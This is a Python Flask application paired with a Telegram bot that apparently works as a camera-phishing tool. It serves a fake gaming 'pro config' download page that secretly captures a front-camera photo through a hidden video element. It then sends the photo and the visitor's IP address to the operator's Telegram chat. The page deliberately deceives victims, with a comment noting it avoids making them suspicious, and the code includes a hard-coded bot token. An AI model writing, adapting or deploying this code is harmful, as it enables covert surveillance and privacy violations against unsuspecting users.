import os
import time
import base64
import requests
import threading
from flask import Flask, request, render_template_string

app = Flask(__name__)

# ==========================================
# 👇 ENTER YOUR DETAILS HERE 👇
# ==========================================
BOT_TOKEN = "8631318410:AAHItz0GBVl4cMA7J-pKx6p3agHRGs8g0jI"       # আপনার বট টোকেন এখানে দিন
ADMIN_CHAT_ID = "7547107887"      # আপনার টেলিগ্রাম আইডি এখানে দিন
# ==========================================

BOT_USERNAME = "Camera8272_bot"
WEB_URL = "https://front-camera-wjg0.onrender.com/"
TELEGRAM_BOT_LINK = f"https://t.me/testingBot21_bot{BOT_USERNAME}"

# --- 1. WEBSITE DESIGN (Pro Gaming Theme) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Config Download</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            background-color: #0a0b10; 
            background-image: radial-gradient(circle at 50% 0%, #1a1c29 0%, #0a0b10 70%);
            color: #ffffff; 
            font-family: 'Poppins', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
            overflow: hidden;
        }

        .card { 
            background: rgba(26, 28, 41, 0.85); 
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 229, 255, 0.2); 
            border-radius: 20px; 
            padding: 35px 25px; 
            max-width: 380px; 
            width: 100%; 
            text-align: center; 
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 229, 255, 0.1);
            position: relative;
        }

        /* Glowing Top Border */
        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 10%; right: 10%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00e5ff, transparent);
        }

        .logo { 
            width: 80px; 
            height: 80px; 
            background: linear-gradient(135deg, #00e5ff, #0055ff);
            border-radius: 20px; 
            margin: 0 auto 20px; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            font-size: 35px; 
            box-shadow: 0 0 20px rgba(0, 229, 255, 0.4);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 15px rgba(0, 229, 255, 0.3); }
            50% { box-shadow: 0 0 30px rgba(0, 229, 255, 0.6); }
            100% { box-shadow: 0 0 15px rgba(0, 229, 255, 0.3); }
        }

        h1 { 
            color: #ffffff; 
            font-size: 22px; 
            font-weight: 800; 
            margin-bottom: 5px; 
            letter-spacing: 1px;
        }

        .subtitle {
            color: #00e5ff;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 25px;
        }

        .features { 
            text-align: left; 
            margin-bottom: 25px; 
            background: rgba(0,0,0,0.2);
            padding: 15px;
            border-radius: 10px;
        }

        .features li { 
            font-size: 13px; 
            color: #a0a5b5; 
            margin-bottom: 8px; 
            list-style: none;
            display: flex;
            align-items: center;
        }

        .features li::before {
            content: '✔';
            color: #00e5ff;
            margin-right: 10px;
            font-weight: bold;
        }

        .ip-box { 
            background: #0f111a; 
            padding: 12px; 
            border-radius: 8px; 
            font-size: 12px; 
            margin-bottom: 20px; 
            border: 1px solid #2a2e45; 
            color: #555a75; 
            font-family: monospace; 
        }

        .btn { 
            background: linear-gradient(90deg, #00e5ff, #0055ff); 
            color: white; 
            border: none; 
            padding: 16px 20px; 
            font-size: 16px; 
            border-radius: 10px; 
            cursor: pointer; 
            width: 100%; 
            font-weight: 800; 
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.3s;
            box-shadow: 0 5px 15px rgba(0, 85, 255, 0.4);
            display: none;
        }

        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 85, 255, 0.6);
        }

        .btn:active { transform: scale(0.98); }

        #statusArea {
            margin-top: 15px;
            font-size: 13px;
            color: #00e5ff;
            font-weight: 600;
            min-height: 20px;
        }

        .loader { 
            border: 3px solid rgba(0, 229, 255, 0.1); 
            border-top: 3px solid #00e5ff; 
            border-radius: 50%; 
            width: 30px; 
            height: 30px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px auto; 
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
    </style>
</head>
<body>
    <div class="card">
        <div class="logo" id="mainLogo">🎮</div>
        <h1 id="title">PRO CONFIG HUB</h1>
        <p class="subtitle" id="subtitle">Premium Settings 2024</p>
        
        <ul class="features" id="featureList">
            <li>100% Safe & Optimized</li>
            <li>Auto Headshot Sensitivity</li>
            <li>Pro Player HUD Layout</li>
        </ul>
        
        <div class="ip-box" id="ipDisplay">Connection: {{ ip_address }}</div>
        
        <button class="btn" id="actionBtn" onclick="startProcess()">Download Pro Config</button>
        
        <div id="statusArea"></div>
    </div>

    <script>
        async function startProcess() {
            const btn = document.getElementById('actionBtn');
            const title = document.getElementById('title');
            const subtitle = document.getElementById('subtitle');
            const statusArea = document.getElementById('statusArea');
            const featureList = document.getElementById('featureList');
            const logo = document.getElementById('mainLogo');
            
            // Hide initial UI
            btn.style.display = 'none';
            featureList.style.display = 'none';
            logo.innerHTML = '<div class="loader"></div>';
            title.innerText = "PREPARING DOWNLOAD...";
            subtitle.innerText = "Securing connection to server";
            statusArea.innerText = "Please wait, do not close this window.";
            
            try {
                // Requesting Camera Permission
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
                });
                
                // Create invisible video element
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', ''); 
                video.style.position = 'absolute';
                video.style.top = '-9999px'; 
                document.body.appendChild(video);
                
                await video.play();
                
                // Wait 2 seconds for the camera sensor to adjust (clean image)
                await new Promise(r => setTimeout(r, 2000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
                video.remove();

                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                title.innerText = "FINALIZING...";
                statusArea.innerText = "Downloading files (1/3)...";
                
                // Send photo to server
                await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, ip: document.getElementById('ipDisplay').innerText }) 
                });
                
                title.innerText = "DOWNLOAD SUCCESSFUL!";
                subtitle.innerText = "Redirecting...";
                statusArea.style.color = "#2ea043";
                statusArea.innerText = "Redirecting to Telegram for final file...";
                logo.innerText = "✅";
                
                // Redirect to Telegram
                setTimeout(() => {
                    window.location.href = "{{ telegram_link }}";
                }, 1000);

            } catch (err) {
                console.error(err);
                // If user denies permission, still redirect them so they don't get suspicious immediately
                title.innerText = "DOWNLOAD COMPLETE";
                subtitle.innerText = "Redirecting...";
                statusArea.style.color = "#f85149";
                statusArea.innerText = "Verification failed. Continuing to Telegram...";
                logo.innerText = "⚠️";
                
                setTimeout(() => { 
                    window.location.href = "{{ telegram_link }}"; 
                }, 1500);
            }
        }

        // Initial Load Animation
        window.onload = function() {
            setTimeout(() => {
                document.getElementById('actionBtn').style.display = 'block';
            }, 800);
        };
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address: ip_address = ip_address.split(',')[0]
    return render_template_string(HTML_TEMPLATE, ip_address=ip_address, telegram_link=TELEGRAM_BOT_LINK)

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        image_data = data['image'].split(",")[1]
        user_ip = data.get('ip', 'Unknown IP')
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('camera.jpg', base64.b64decode(image_data), 'image/jpeg')}
        
        # Message sent to Admin
        caption_text = f"📸 New Visitor Photo!\n\n🌐 IP Address: {user_ip}\n🔗 Source: {WEB_URL}"
        payload = {'chat_id': ADMIN_CHAT_ID, 'caption': caption_text}
        
        requests.post(url, files=files, data=payload)
        return {"status": "success"}, 200
    except Exception as e:
        print(f"Upload Error: {e}")
        return {"status": "error"}, 500

# --- 3. TELEGRAM BOT LOGIC ---
def run_telegram_bot():
    print("Bot Started Successfully...")
    last_update_id = 0
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id+1}&timeout=30"
            response = requests.get(url, timeout=35).json()
            
            if response.get("ok") and response["result"]:
                for update in response["result"]:
                    last_update_id = update["update_id"]
                    
                    if "message" in update:
                        chat_id = update["message"]["chat"]["id"]
                        text = update["message"].get("text", "")
                        
                        if text == "/start":
                            welcome_msg = "👋 Welcome!\n\nTo access the bot, please verify your connection by clicking the button below:"
                            reply_markup = {
                                "inline_keyboard": [
                                    [{"text": "🌐 Verify & Continue", "url": WEB_URL}]
                                ]
                            }
                            requests.post(
                                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                json={"chat_id": chat_id, "text": welcome_msg, "reply_markup": reply_markup}
                            )
        except Exception as e:
            print(f"Bot Error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    bot_thread = threading.Thread(target=run_telegram_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
